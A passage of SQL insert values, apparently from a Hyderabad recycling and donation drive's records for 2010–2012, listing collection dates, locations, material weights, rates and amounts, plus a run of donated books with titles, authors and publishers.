(584, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 36, 2, '4.0', 0, 0, 50, '', '', '', '', ''),
(585, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 36, 1, '2.0', 5, 10, 10, '', '', '', '', ''),
(586, '2011-05-01', 72, 'Gachibowli', 'Hyderabad', 42, 1, '5.0', 8, 40, 40, 'includes note books', '', '', '', ''),
(587, '2011-05-01', 72, 'Gachibowli', 'Hyderabad', 43, 1, '8.0', 7, 56, 56, '', '', '', '', ''),
(588, '2011-05-01', 72, 'Gachibowli', 'Hyderabad', 45, 1, '4.0', 5, 15, 20, '', '', '', '', ''),
(589, '2011-05-03', 68, 'Gachibowli', 'Hyderabad', 43, 1, '70.0', 7, 490, 490, '', '', '', '', ''),
(590, '2011-05-03', 68, 'Gachibowli', 'Hyderabad', 40, 1, '3.0', 15, 45, 45, '', '', '', '', ''),
(591, '2011-05-03', 68, 'Gachibowli', 'Hyderabad', 37, 1, '156.0', 6, 936, 936, '', '', '', '', ''),
(592, '2011-05-03', 68, 'Gachibowli', 'Hyderabad', 36, 1, '11.0', 4, 44, 44, '', '', '', '', ''),
(593, '2011-05-21', 69, 'Somajiguda', 'Hyderabad', 37, 1, '16.0', 6, 96, 96, '', '', '', '', ''),
(594, '2011-05-21', 69, 'Somajiguda', 'Hyderabad', 44, 1, '31.0', 10, 310, 310, '', '', '', '', ''),
(595, '2011-04-30', 65, 'Chikadpally', 'Hyderabad', 42, 1, '23.0', 6, 138, 150, '', '', '', '', ''),
(596, '2011-04-30', 65, 'Chikadpally', 'Hyderabad', 41, 2, '2.0', 0, 0, 20, '2 Pairs of foot wear', '', '', '', ''),
(597, '2011-04-30', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '11.0', 5, 55, 55, '', '', '', '', ''),
(598, '2011-04-30', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '12.0', 7, 84, 84, '', '', '', '', ''),
(599, '2011-04-30', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '6.0', 5, 30, 30, '', '', '', '', ''),
(600, '2011-04-30', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '1.0', 15, 15, 12, '', '', '', '', ''),
(601, '2011-04-30', 63, 'PadmaraoNagar', 'Hyderabad', 38, 1, '26.0', 15, 390, 390, '', '', '', '', ''),
(602, '2011-04-06', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '62.0', 15, 930, 930, 'Cot Donated by Rajshekar from Domalguda.', '', '', '', ''),
(603, '2011-04-06', 71, 'Koti', 'Hyderabad', 42, 1, '65.0', 6, 325, 350, '', '', '', '', ''),
(604, '2011-03-13', 68, 'Gachibowli', 'Hyderabad', 42, 1, '95.0', 6, 570, 570, '', '', '', '', ''),
(605, '2011-03-13', 68, 'Gachibowli', 'Hyderabad', 43, 1, '147.0', 7, 1029, 1029, '', '', '', '', ''),
(606, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 42, 1, '6.0', 5, 30, 30, '', '', '', '', ''),
(607, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '39.0', 7, 273, 273, '', '', '', '', ''),
(608, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 47, 1, '1.0', 5, 5, 5, '', '', '', '', ''),
(609, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 48, 1, '3.0', 12, 24, 30, '', '', '', '', ''),
(610, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 40, 1, '2.0', 16, 16, 24, '', '', '', '', ''),
(611, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 44, 1, '6.0', 7, 42, 42, '', '', '', '', ''),
(612, '2011-03-07', 64, 'Panjagutta-ABS', 'Hyderabad', 39, 2, '2.0', 1, 2, 2, '', '', '', '', ''),
(613, '2011-03-16', 64, 'Panjagutta-ABS', 'Hyderabad', 45, 1, '25.0', 15, 375, 375, 'Donated by Shweta, Architect', '', '', '', ''),
(614, '2011-03-16', 64, 'Panjagutta-ABS', 'Hyderabad', 40, 1, '10.0', 18, 180, 180, 'Donated by Shweta Architect', '', '', '', ''),
(615, '2011-03-26', 65, 'Chikadpally', 'Hyderabad', 43, 1, '50.0', 6, 300, 300, '', '', '', '', ''),
(616, '2011-03-26', 71, 'Banjara Hills', 'Hyderabad', 42, 1, '20.0', 7, 140, 140, '', '', '', '', ''),
(617, '2011-03-26', 71, 'Banjara Hills', 'Hyderabad', 36, 1, '31.0', 5, 155, 155, '', '', '', '', ''),
(618, '2011-03-26', 71, 'Banjara Hills', 'Hyderabad', 37, 1, '33.0', 7, 231, 231, '', '', '', '', ''),
(619, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(620, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '13.0', 7, 84, 88, '', '', '', '', ''),
(621, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(622, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '1.0', 10, 10, 10, '', '', '', '', ''),
(623, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '2.0', 15, 15, 22, '', '', '', '', ''),
(624, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 39, 2, '8.0', 0, 0, 20, '', '', '', '', ''),
(625, '2011-03-26', 63, 'PadmaraoNagar', 'Hyderabad', 41, 2, '1.0', 0, 0, 20, 'Switch board', '', '', '', ''),
(626, '2011-02-26', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '29.0', 5, 140, 142, '', '', '', '', ''),
(627, '2011-02-26', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '13.0', 7, 91, 91, '', '', '', '', ''),
(628, '2011-02-26', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '7.0', 5, 30, 33, '', '', '', '', ''),
(629, '2011-02-26', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '3.0', 15, 30, 38, '', '', '', '', ''),
(630, '2011-01-29', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '16.0', 5, 80, 80, '', '', '', '', ''),
(631, '2011-01-29', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '12.0', 7, 77, 81, '', '', '', '', ''),
(632, '2011-01-29', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(633, '2011-01-30', 64, 'Panjagutta-ABS', 'Hyderabad', 45, 1, '2.0', 7, 14, 14, '', '', '', '', ''),
(634, '2011-01-30', 64, 'Panjagutta-ABS', 'Hyderabad', 44, 1, '22.0', 7, 154, 154, '', '', '', '', ''),
(635, '2011-01-30', 64, 'Panjagutta-ABS', 'Hyderabad', 42, 1, '1.0', 5, 5, 5, '', '', '', '', ''),
(636, '2011-01-30', 64, 'Panjagutta-ABS', 'Hyderabad', 47, 1, '1.0', 10, 10, 10, '', '', '', '', ''),
(637, '2011-01-30', 64, 'Panjagutta-ABS', 'Hyderabad', 47, 1, '1.0', 2, 2, 2, '', '', '', '', ''),
(638, '2011-01-07', 70, 'Somajiguda', 'Hyderabad', 42, 1, '20.0', 7, 140, 140, '', '', '', '', ''),
(639, '2011-01-13', 70, 'Somajiguda', 'Hyderabad', 44, 1, '6.0', 7, 42, 45, '', '', '', '', ''),
(640, '2011-01-19', 70, 'Somajiguda', 'Hyderabad', 42, 1, '11.0', 6, 66, 66, '', '', '', '', ''),
(641, '2011-01-29', 70, 'Somajiguda', 'Hyderabad', 42, 1, '8.0', 4, 28, 30, '', '', '', '', ''),
(642, '2011-01-29', 70, 'Somajiguda', 'Hyderabad', 44, 1, '19.0', 7, 133, 133, '', '', '', '', ''),
(643, '2011-01-29', 70, 'Somajiguda', 'Hyderabad', 42, 1, '30.0', 5, 150, 150, '', '', '', '', ''),
(644, '2011-01-29', 70, 'Somajiguda', 'Hyderabad', 45, 1, '1.0', 5, 5, 5, '', '', '', '', ''),
(645, '2010-12-25', 65, 'Chikadpally', 'Hyderabad', 42, 1, '37.0', 4, 148, 148, '', '', '', '', ''),
(646, '2010-12-25', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '18.0', 6, 90, 99, '', '', '', '', ''),
(647, '2010-12-25', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '37.0', 5, 185, 185, '', '', '', '', ''),
(648, '2010-12-25', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '12.0', 7, 84, 84, '', '', '', '', ''),
(649, '2010-12-25', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '2.0', 10, 20, 20, '', '', '', '', ''),
(650, '2010-12-25', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '10.0', 15, 135, 143, '', '', '', '', ''),
(651, '2010-12-26', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '38.0', 7, 266, 266, '', '', '', '', ''),
(652, '2010-12-26', 64, 'Panjagutta-ABS', 'Hyderabad', 42, 1, '2.0', 7, 14, 14, '', '', '', '', ''),
(653, '2010-11-27', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '21.0', 5, 84, 95, '', '', '', '', ''),
(654, '2010-11-27', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '6.0', 7, 36, 39, '', '', '', '', ''),
(655, '2010-11-27', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '14.0', 4, 42, 49, '', '', '', '', ''),
(656, '2010-11-27', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '26.0', 15, 390, 390, '', '', '', '', ''),
(657, '2010-11-28', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '4.0', 7, 28, 28, '', '', '', '', ''),
(658, '2010-11-28', 64, 'Panjagutta-ABS', 'Hyderabad', 42, 1, '15.0', 6, 90, 90, '', '', '', '', ''),
(659, '2010-11-28', 64, 'Panjagutta-ABS', 'Hyderabad', 45, 1, '5.0', 5, 20, 22, '', '', '', '', ''),
(660, '2010-11-28', 64, 'Panjagutta-ABS', 'Hyderabad', 40, 1, '5.0', 15, 60, 68, '', '', '', '', ''),
(661, '2010-10-02', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '20.0', 4, 80, 80, '', '', '', '', ''),
(662, '2010-10-02', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '98.0', 4, 392, 392, '', '', '', '', ''),
(663, '2010-10-02', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '29.0', 6, 168, 171, '', '', '', '', ''),
(664, '2010-10-02', 63, 'PadmaraoNagar', 'Hyderabad', 41, 1, '1.0', 0, 0, 21, '', '', '', '', ''),
(665, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '91.0', 5, 360, 408, '', '', '', '', ''),
(666, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '11.0', 7, 60, 68, '', '', '', '', ''),
(667, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '7.0', 4, 24, 26, '', '', '', '', ''),
(668, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '2.0', 10, 20, 20, '', '', '', '', ''),
(669, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '1.0', 13, 13, 13, '', '', '', '', ''),
(670, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 38, 1, '68.0', 15, 1020, 1020, '', '', '', '', ''),
(671, '2010-10-30', 63, 'PadmaraoNagar', 'Hyderabad', 41, 2, '1.0', 0, 0, 22, '', '', '', '', ''),
(672, '2011-10-28', 138, 'Ameerpet', 'Hyderabad', 38, 2, '8.0', 0, 0, 1500, '2 Monitors, 3 key boards & 3 mouse from Karmayog Seva Mela', '', '', '', ''),
(673, '2011-10-28', 138, 'Ameerpet', 'Hyderabad', 38, 1, '12.0', 0, 0, 270, 'Plastic & Cables from Karmayog Seva Mela', '', '', '', ''),
(674, '2011-10-28', 138, 'Ameerpet', 'Hyderabad', 41, 2, '1.0', 0, 0, 100, 'Foot wear', '', '', '', ''),
(675, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '8.0', 8, 56, 60, '', '', '', '', ''),
(676, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(677, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '6.0', 5, 30, 30, '', '', '', '', ''),
(678, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '5.0', 5, 20, 22, '', '', '', '', ''),
(679, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '1.0', 15, 0, 8, '', '', '', '', ''),
(680, '2011-10-29', 63, 'PadmaraoNagar', 'Hyderabad', 54, 2, '1.0', 5, 5, 5, '', '', '', '', ''),
(681, '2011-10-30', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '10.0', 8, 80, 80, '', '', '', '', ''),
(682, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 40, 1, '5.0', 18, 72, 81, '', '', '', '', ''),
(683, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 48, 1, '14.0', 10, 140, 140, '', '', '', '', ''),
(684, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 54, 1, '22.0', 1, 22, 22, '', '', '', '', ''),
(685, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 47, 1, '9.0', 5, 45, 45, '', '', '', '', ''),
(686, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 37, 1, '51.0', 7, 350, 352, '', '', '', '', ''),
(687, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 43, 1, '183.0', 8, 1456, 1460, '', '', '', '', ''),
(688, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 36, 1, '14.0', 6, 84, 84, '', '', '', '', ''),
(689, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 39, 2, '146.0', 2, 292, 292, 'Big beer bottles', '', '', '', ''),
(690, '2011-10-30', 73, 'Gachibowli', 'Hyderabad', 39, 2, '74.0', 1, 74, 74, 'Small beer bottles', '', '', '', ''),
(691, '2011-10-31', 68, 'Gachibowli', 'Hyderabad', 37, 1, '134.0', 6, 804, 804, '', '', '', '', ''),
(692, '2011-10-31', 68, 'Gachibowli', 'Hyderabad', 43, 1, '133.0', 8, 1064, 1066, '', '', '', '', ''),
(693, '2011-11-01', 67, 'Gachibowli', 'Hyderabad', 64, 1, '163.0', 8, 1296, 1300, '', '', '', '', ''),
(694, '2011-11-01', 67, 'Gachibowli', 'Hyderabad', 37, 1, '181.0', 6, 1086, 1036, '', '', '', '', ''),
(695, '2011-11-01', 67, 'Gachibowli', 'Hyderabad', 43, 1, '47.0', 8, 376, 364, '', '', '', '', ''),
(696, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 39, 2, '1.0', 0, 0, 720, '', '', '', '', ''),
(697, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 39, 2, '14.0', 0, 0, 14, '', '', '', '', ''),
(698, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 48, 1, '18.0', 8, 144, 144, '', '', '', '', ''),
(699, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 38, 1, '29.0', 25, 700, 712, '', '', '', '', ''),
(700, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 47, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(701, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 40, 1, '2.0', 18, 36, 36, '', '', '', '', ''),
(702, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 54, 1, '16.0', 1, 16, 16, '', '', '', '', ''),
(703, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 42, 1, '29.0', 6, 168, 171, '', '', '', '', ''),
(704, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 37, 1, '37.0', 7, 252, 255, '', '', '', '', ''),
(705, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 43, 1, '156.0', 8, 1248, 1248, '', '', '', '', ''),
(706, '2011-11-27', 73, 'Gachibowli', 'Hyderabad', 49, 1, '13.0', 5, 60, 62, '', '', '', '', ''),
(707, '2011-11-29', 67, 'Gachibowli', 'Hyderabad', 37, 1, '117.0', 7, 819, 819, '', '', '', '', ''),
(708, '2011-11-29', 67, 'Gachibowli', 'Hyderabad', 64, 1, '111.0', 5, 555, 555, 'due to mixing of color paper', '', '', '', ''),
(709, '2011-11-29', 67, 'Gachibowli', 'Hyderabad', 46, 1, '15.0', 8, 112, 116, '59 plastic cans and 94 water bottles', '', '', '', ''),
(710, '2011-11-26', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '23.0', 7, 161, 161, '', '', '', '', ''),
(711, '2011-11-26', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '43.0', 5, 210, 213, '', '', '', '', ''),
(712, '2011-11-26', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(713, '2011-12-03', 68, 'Gachibowli', 'Hyderabad', 43, 1, '94.0', 8, 752, 752, '', '', '', '', ''),
(714, '2011-12-03', 68, 'Gachibowli', 'Hyderabad', 37, 1, '108.0', 6, 648, 650, '', '', '', '', ''),
(715, '2011-12-03', 68, 'Gachibowli', 'Hyderabad', 45, 1, '3.0', 8, 24, 24, '', '', '', '', ''),
(716, '2011-12-03', 68, 'Gachibowli', 'Hyderabad', 64, 1, '14.0', 6, 84, 84, '', '', '', '', ''),
(717, '2011-12-03', 68, 'Gachibowli', 'Hyderabad', 39, 1, '10.0', 1, 10, 10, '', '', '', '', ''),
(718, '2011-12-03', 71, 'Banjara Hills', 'Hyderabad', 37, 1, '176.0', 5, 880, 900, '', '', '', '', ''),
(719, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 42, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(720, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 43, 1, '57.0', 7, 396, 395, '', '', '', '', ''),
(721, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 37, 1, '19.0', 7, 130, 129, '', '', '', '', ''),
(722, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 48, 1, '23.0', 8, 184, 184, '', '', '', '', ''),
(723, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 40, 1, '20.0', 22, 429, 429, '', '', '', '', ''),
(724, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 54, 1, '10.0', 1, 10, 10, '', '', '', '', ''),
(725, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 1, '29.0', 6, 171, 171, '', '', '', '', ''),
(726, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 49, 1, '5.0', 5, 23, 23, '', '', '', '', ''),
(727, '2011-12-23', 138, 'Ameerpet', 'Hyderabad', 42, 1, '53.0', 6, 318, 320, '', '', '', '', ''),
(728, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Trusted Advisor ', 'David H. Maister , Charles H. Green & Robert M. Galford', 'Simon & Schuster', 'Business', 'General'),
(729, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Business is People ', 'C. Northcote Parkinson , M.K. Rustomji', 'Vision Books', 'Business', 'General'),
(730, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Personnel / Human Resource Management', 'David A. DeCenzo , Stephen P. Robbins', 'Prentice-Hall of India', 'Business', 'HR'),
(731, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Modern Economic Theory', 'Sampat Mukherjee', 'New Age International', 'Business', 'Economics'),
(732, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Organisational Theory, Design and Change', 'Gareth R. Jones', 'Pearson Education', 'Business', 'HR'),
(733, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Organisational Behavior', 'Stephen P. Robbins', 'Pearson Education', 'Business', 'HR'),
(734, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 2, '2.0', 0, 0, 0, 'The Complete Novels of Jane Austen', 'Jane Austen', 'Random House', 'Fiction', 'Literature'),
(735, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Chicken Soup for the Mother''s Soul', 'Jack Canfield, Mark Victor Hansen, Jennifer Read Hawthorne', 'Health Communications', 'Non-Fiction', 'Self Help'),
(736, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Believe In The God Who Believes In You', 'Robert H. Schuller', 'Orient Paperbacks', 'Non-Fiction', 'Self Help'),
(737, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Teaching Childreen Joy', 'Linda & Richard Eyre', 'Ballantine Books', 'Non-Fiction', 'Childcare'),
(738, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Book Of Tofu', 'William Shurtleff & Akiko Aoyagi', 'Ballantine Books', 'Non-Fiction', 'Food'),
(739, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Diet & Salad', 'N. W. Walker', 'Norwalk Press', 'Non-Fiction', 'Food'),
(746, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Snow White & Seven Dwarfs', 'NA', 'My Kids World', 'Children', 'Story'),
(745, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Clever Hare', 'NA', 'Ladybird', 'Children', 'Story'),
(744, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Foolish Fox', 'NA', 'PaperKraft', 'Children', 'Story'),
(747, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Night Of The Ninjas', 'Mary Pope Osborne', 'Random House', 'Children', 'Story'),
(748, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Hare and The Tortoise', 'NA', 'Butterfly Books', 'Children', 'Story'),
(749, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Naughtiest Girl Saves The Day', 'Enid Blyton', 'Hodder Children''s Books', 'Children', 'Novel'),
(750, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Knight at Dawn', 'Mary Pope Osborne', 'Random House', 'Children', 'Story'),
(751, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Mystery of Mindnet', 'Aniruddha Sen Gupta', 'Scholastic', 'Children', 'Novel'),
(752, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'The Story of Prince Ahmed The Fairy Pari Banou and Other Stories', 'NA', 'Indiana Books', 'Children', 'Novel'),
(753, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Krishnadeva Raya', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(754, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Moral Stories From Panchatantra', 'NA', 'Manoj Publications', 'Children', 'Story'),
(755, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Moral Story Of Grandpa', 'NA', 'Manoj Publications', 'Children', 'Story'),
(756, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Battle Of Wits - A Jataka Tale', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(757, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '2.0', 0, 0, 0, 'The Adventures Of Baddu And Chhotu', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(758, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Birbal The Just', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(759, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Shiva And Parvathi', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(760, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Jataka Tales - Jackal Stories', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(761, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Tales Of Sai Baba', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(762, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Raja Bhoja', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(763, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Ganesha', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(764, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Prithviraj Chauhan', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(765, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 37, 2, '1.0', 0, 0, 0, 'A Bag Of Gold Coins', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(766, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Gopal And The Cowherd', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(767, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Madhvacharya', 'NA', 'Amar Chitra Katha', 'Children', 'Story'),
(768, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Selected Stories From Panchatantra', 'NA', 'Alka Publications', 'Children', 'Story'),
(769, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '1.0', 0, 0, 0, 'Disney Princess', 'Grace Windsor', 'Sterling Publishers', 'Children', 'Story'),
(770, '2011-12-25', 73, 'Gachibowli', 'Hyderabad', 36, 2, '2.0', 0, 0, 0, 'Selected Stories From Panchatantra', 'NA', 'Manoj Publications', 'Children', 'Story'),
(771, '2011-12-28', 67, 'Gachibowli', 'Hyderabad', 64, 1, '465.0', 6, 2787, 2787, '', '', '', '', ''),
(772, '2011-12-28', 67, 'Gachibowli', 'Hyderabad', 37, 1, '130.0', 7, 910, 910, '', '', '', '', ''),
(773, '2011-12-28', 67, 'Gachibowli', 'Hyderabad', 46, 1, '12.0', 8, 92, 92, '', '', '', '', ''),
(774, '2011-12-31', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '5.0', 5, 23, 22, '', '', '', '', ''),
(775, '2011-12-31', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '40.0', 8, 320, 320, '', '', '', '', ''),
(776, '2011-12-31', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '2.0', 5, 8, 8, '', '', '', '', ''),
(777, '2011-12-31', 63, 'PadmaraoNagar', 'Hyderabad', 49, 1, '2.0', 3, 6, 5, '', '', '', '', ''),
(778, '2011-12-31', 63, 'PadmaraoNagar', 'Hyderabad', 46, 1, '4.0', 10, 35, 35, '', '', '', '', ''),
(779, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 43, 1, '329.0', 8, 2628, 2628, '', '', '', '', ''),
(780, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 45, 1, '38.0', 12, 450, 450, '', '', '', '', ''),
(781, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 38, 1, '11.0', 25, 263, 263, '', '', '', '', ''),
(782, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 39, 2, '115.0', 1, 115, 115, '', '', '', '', ''),
(783, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 49, 1, '15.0', 5, 75, 75, '', '', '', '', ''),
(784, '2012-01-29', 73, 'Gachibowli', 'Hyderabad', 37, 1, '33.0', 6, 195, 195, '', '', '', '', ''),
(785, '2012-01-29', 88, 'Gachibowli', 'Hyderabad', 42, 1, '60.0', 8, 480, 480, '', '', '', '', ''),
(786, '2012-01-29', 88, 'Gachibowli', 'Hyderabad', 37, 1, '10.0', 6, 60, 60, '', '', '', '', ''),
(787, '2012-01-29', 88, 'Gachibowli', 'Hyderabad', 45, 1, '10.0', 12, 120, 120, '', '', '', '', ''),
(788, '2012-01-29', 88, 'Gachibowli', 'Hyderabad', 49, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(789, '2012-02-01', 68, 'Gachibowli', 'Hyderabad', 43, 1, '68.0', 7, 476, 476, '', '', '', '', ''),
(790, '2012-02-01', 68, 'Gachibowli', 'Hyderabad', 37, 1, '104.0', 6, 624, 624, '', '', '', '', ''),
(791, '2012-02-01', 68, 'Gachibowli', 'Hyderabad', 64, 1, '24.0', 6, 144, 144, '', '', '', '', ''),
(792, '2012-02-01', 68, 'Gachibowli', 'Hyderabad', 45, 1, '2.0', 10, 20, 20, '', '', '', '', ''),
